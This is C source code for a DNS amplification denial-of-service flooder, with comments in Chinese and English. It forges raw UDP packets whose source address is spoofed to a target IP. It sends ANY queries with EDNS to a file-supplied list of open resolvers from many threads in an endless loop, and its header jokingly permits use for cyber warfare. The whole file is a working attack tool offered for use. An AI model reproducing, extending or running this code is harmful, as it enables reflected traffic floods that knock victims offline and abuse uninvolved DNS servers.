/*
        This is released under the GNU GPL License v3.0, and is allowed to be used for cyber warfare. ;)
*/

#include <time.h> // 时间头文件
#include <pthread.h> // 线程头文件
#include <unistd.h> // UNIX标准头文件
#include <stdio.h> // 标准输入输出头文件
#include <stdlib.h> // 标准库头文件
#include <string.h> // 字符串操作头文件
#include <sys/socket.h> // 套接字头文件
#include <netinet/ip.h> // IP协议头文件
#include <netinet/udp.h> // UDP协议头文件
#include <arpa/inet.h> // Internet网络功能头文件

#define MAX_PACKET_SIZE 8192 // 最大报文大小
#define PHI 0x9e3779b9 // 常量用于随机数生成器
#define PACKETS_PER_RESOLVER 5 // 每个解析器发送的报文数量

static uint32_t Q[4096], c = 362436; // 随机数生成器数组及初始值

// 链表节点结构体
struct list
{
        struct sockaddr_in data; // 解析器地址
        char domain[256]; // 域名
        int line; // 行号
        struct list *next; // 下一个节点指针
        struct list *prev; // 上一个节点指针
};
struct list *head; // 链表头指针

// 线程数据结构体
struct thread_data
{
        int thread_id; // 线程ID
        struct list *list_node; // 链表节点指针
        struct sockaddr_in sin; // 目标地址
        int port; // 端口号
};

// DNS头部结构体
struct DNS_HEADER
{
        unsigned short id; // 标识号

        unsigned char rd : 1; // recursion desired 期望递归查询
        unsigned char tc : 1; // truncated message 消息被截断
        unsigned char aa : 1; // authoritive answer 权威答案
        unsigned char opcode : 4; // purpose of message 消息用途
        unsigned char qr : 1; // query/response flag 查询/响应标志

        unsigned char rcode : 4; // response code 响应码
        unsigned char cd : 1; // checking disabled 禁止检查
        unsigned char ad : 1; // authenticated data 经认证的数据
        unsigned char z : 1; // its z! reserved 保留位
        unsigned char ra : 1; // recursion available 递归可用

        unsigned short q_count; // number of question entries 问题条目数
        unsigned short ans_count; // number of answer entries 答案条目数
        unsigned short auth_count; // number of authority entries 权威条目数
        unsigned short add_count; // number of resource entries 附加资源条目数
};

// 常量大小的问题记录结构体
struct QUESTION
{
        unsigned short qtype; // 类型
        unsigned short qclass; // 类别
};

// 常量大小的查询结构体
struct QUERY
{
        unsigned char *name; // 名称
        struct QUESTION *ques; // 问题记录
};

// 将域名转换为DNS格式
void ChangetoDnsNameFormat(unsigned char *dns, unsigned char *host)
{
        int lock = 0, i;
        strcat((char *)host, "."); // Append dot to the end of the domain name.

        for (i = 0; i < strlen((char *)host); i++) // Loop through the host name.
        {
                if (host[i] == '.') // If a dot is found,
                {
                        *dns++ = i - lock; // Write the length of the label.
                        for (; lock < i; lock++) // Copy the characters of the domain name.
                        {
                                *dns++ = host[lock]; // Copy each character.
                        }
                        lock++; // Update the lock position.
                }
        }
        *dns++ = '\0'; // End the label with a null byte.
}

// 初始化随机数生成器
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) // Initialize the rest of the array.
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

// 随机数生成函数
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c)
        {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

// 计算UDP头部校验和
unsigned short csum(unsigned short *buf, int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--) // Sum all words.
                sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum); // Return the one's complement of the sum.
}

// 设置UDP头部（此处为空函数）
void setup_udp_header(struct udphdr *udph)
{
}

// 线程函数
void *flood(void *par1)
{
        struct thread_data *td = (struct thread_data *)par1;

        fprintf(stdout, "Thread %d started\n", td->thread_id);

        char strPacket[MAX_PACKET_SIZE]; // 报文缓冲区
        int iPayloadSize = 0; // 有效负载大小

        struct sockaddr_in sin = td->sin; // 目标地址
        struct list *list_node = td->list_node; // 解析器列表节点
        int iPort = td->port; // 端口号

        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); // 创建原始套接字
        if (s < 0)
        {
                fprintf(stderr, "Could not open raw socket. You need to be root!\n"); // 错误提示
                exit(-1);
        }

        // Initialize the random generator.
        init_rand(time(NULL));

        // Clear the data.
        memset(strPacket, 0, MAX_PACKET_SIZE);

        // Make the packet.
        struct iphdr *iph = (struct iphdr *)&strPacket; // IP头部指针
        iph->ihl = 5; // IP头部长度
        iph->version = 4; // IP版本
        iph->tos = 0; // 服务类型
        iph->tot_len = sizeof(struct iphdr) + 38; // 总长度
        iph->id = htonl(54321); // 标识
        iph->frag_off = 0; // 片偏移
        iph->ttl = MAXTTL; // TTL
        iph->protocol = IPPROTO_UDP; // 协议类型
        iph->check = 0; // 校验和
        iph->saddr = inet_addr("192.168.3.100"); // 源地址

        iPayloadSize += sizeof(struct iphdr); // 增加IP头部大小

        struct udphdr *udph = (struct udphdr *)&strPacket[iPayloadSize]; // UDP头部指针
        udph->source = htons(iPort); // 源端口
        udph->dest = htons(53); // 目标端口
        udph->check = 0; // 校验和

        iPayloadSize += sizeof(struct udphdr); // 增加UDP头部大小

        struct DNS_HEADER *dns = (struct DNS_HEADER *)&strPacket[iPayloadSize]; // DNS头部指针
        dns->id = (unsigned short)htons(rand_cmwc()); // 设置事务ID
        dns->qr = 0; // This is a query 这是一个查询
        dns->opcode = 0; // This is a standard query 这是一个标准查询
        dns->aa = 0; // Not Authoritative 非权威答案
        dns->tc = 0; // This message is not truncated 消息未被截断
        dns->rd = 1; // Recursion Desired 期望递归查询
        dns->ra = 0; // Recursion not available! hey we dont have it (lol) 递归不可用
        dns->z = 0; // 保留位
        dns->ad = 0; // 经认证的数据
        dns->cd = 0; // 禁止检查
        dns->rcode = 0; // 响应码
        dns->q_count = htons(1); // we have only 1 question 只有一个问题
        dns->ans_count = 0; // 答案条目数
        dns->auth_count = 0; // 权威条目数
        dns->add_count = htons(1); // 附加资源条目数

        iPayloadSize += sizeof(struct DNS_HEADER); // 增加DNS头部大小

        sin.sin_port = udph->source; // 设置源端口
        iph->saddr = sin.sin_addr.s_addr; // 设置源地址
        iph->daddr = list_node->data.sin_addr.s_addr; // 设置目标地址
        iph->check = csum((unsigned short *)strPacket, iph->tot_len >> 1); // 计算校验和

        char strDomain[256]; // 域名缓冲区
        int i;
        int iAdditionalSize = 0; // 附加数据大小

        while (1)
        {
                usleep(0); // 微秒级休眠

                // Set the next node.
                list_node = list_node->next;

                // Clear the old domain and question.
                memset(&strPacket[iPayloadSize + iAdditionalSize], 0, iAdditionalSize);

                // Add the chosen domain and question.
                iAdditionalSize = 0;

                unsigned char *qname = (unsigned char *)&strPacket[iPayloadSize + iAdditionalSize];

                strcpy(strDomain, list_node->domain); // 复制域名
                ChangetoDnsNameFormat(qname, strDomain); // 转换为DNS格式
                // printf("!!%s %d\n", list_node->domain, list_node->line);

                iAdditionalSize += strlen(qname) + 1; // 增加域名大小

                struct QUESTION *qinfo = (struct QUESTION *)&strPacket[iPayloadSize + iAdditionalSize];
                qinfo->qtype = htons(255); // type of the query , A , MX , CNAME , NS etc 查询类型
                qinfo->qclass = htons(1); // 类别

                iAdditionalSize += sizeof(struct QUESTION); // 增加问题记录大小

                void *edns = (void *)&strPacket[iPayloadSize + iAdditionalSize];
                memset(edns + 2, 0x29, 1); // 设置EDNS扩展字段
                memset(edns + 3, 0x23, 1);
                memset(edns + 4, 0x28, 1);

                iAdditionalSize += 11; // 增加EDNS字段大小

                // Set new node data.
                iph->daddr = list_node->data.sin_addr.s_addr;

                udph->len = htons((iPayloadSize + iAdditionalSize + 5) - sizeof(struct iphdr)); // 设置UDP长度
                iph->tot_len = iPayloadSize + iAdditionalSize + 5; // 设置IP总长度

                udph->source = htons(rand_cmwc() & 0xFFFF); // 设置随机源端口
                iph->check = csum((unsigned short *)strPacket, iph->tot_len >> 1); // 重新计算校验和

                // Send the packet.
                for (i = 0; i < PACKETS_PER_RESOLVER; i++)
                {
                        sendto(s, strPacket, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
                }
        }
}

// 解析解析器配置行
void ParseResolverLine(char *strLine, int iLine)
{
        char caIP[32] = ""; // IP地址缓冲区
        char caDNS[512] = ""; // 域名缓冲区

        int i;
        char buffer[512] = ""; // 临时缓冲区

        int moved = 0; // 移动标识

        for (i = 0; i < strlen(strLine); i++) // Loop through the line.
        {
                if (strLine[i] == ' ' || strLine[i] == '\n' || strLine[i] == '\t') // Ignore whitespace.
                {
                        moved++;
                        continue;
                }

                if (moved == 0) // If we're reading the IP address.
                {
                        caIP[strlen(caIP)] = (char)strLine[i]; // Copy the IP address.
                }
                else if (moved == 1) // If we're reading the domain name.
                {
                        caDNS[strlen(caDNS)] = (char)strLine[i]; // Copy the domain name.
                }
        }

        // printf("Found resolver %s, domain %s!\n", caIP, caDNS); // Print the resolver information.

        if (head == NULL) // If the list is empty.
        {
                head = (struct list *)malloc(sizeof(struct list)); // Allocate memory for the new node.

                bzero(&head->data, sizeof(head->data)); // Clear the data.

                head->data.sin_addr.s_addr = inet_addr(caIP); // Set the IP address.
                head->data.sin_port = htons(53); // Set the port number.
                strcpy(head->domain, caDNS); // Copy the domain name.
                head->line = iLine; // Set the line number.
                head->next = head; // Set the pointers to form a loop.
                head->prev = head;
        }
        else // If the list is not empty.
        {
                struct list *new_node = (struct list *)malloc(sizeof(struct list)); // Allocate memory for the new node.

                memset(new_node, 0x00, sizeof(struct list)); // Clear the data.

                new_node->data.sin_addr.s_addr = inet_addr(caIP); // Set the IP address.
                new_node->data.sin_port = htons(53); // Set the port number.
                strcpy(new_node->domain, caDNS); // Copy the domain name.
                new_node->prev = head; // Set the previous pointer.
                head->line = iLine; // Set the line number.
                new_node->next = head->next; // Set the next pointer.
                head->next = new_node; // Insert the new node into the list.
        }
}

int main(int argc, char *argv[])
{
        if (argc < 4)
        {
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "\nUsage: %s <target IP/hostname> <port to hit> <reflection file> <number threads to use> <time>\n", argv[0]);
                exit(-1);
        }

        head = NULL;

        char *strLine = (char *)malloc(256);
        strLine = memset(strLine, 0x00, 256);

        char strIP[32] = "";
        char strDomain[256] = "";

        int iLine = 0; // 0 = ip, 1 = domain.

        FILE *list_fd = fopen(argv[3], "r");
        while (fgets(strLine, 256, list_fd) != NULL)
        {
                ParseResolverLine(strLine, iLine);
                iLine++;
        }

        int i = 0;
        int num_threads = atoi(argv[4]);

        struct list *current = head->next;
        pthread_t thread[num_threads];
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(0);
        sin.sin_addr.s_addr = inet_addr(argv[1]);
        struct thread_data td[num_threads];

        int iPort = atoi(argv[2]);

        printf("Flooding %s\n", argv[1], iPort);

        for (i = 0; i < num_threads; i++)
        {
                td[i].thread_id = i;
                td[i].sin = sin;
                td[i].list_node = current;
                td[i].port = iPort;
                pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
        }

        fprintf(stdout, "Starting Flood...\n");

        if (argc > 4)
        {
                sleep(atoi(argv[5]));
        }
        else
        {
                while (1)
                {
                        sleep(1);
                }
        }

        return 0;
}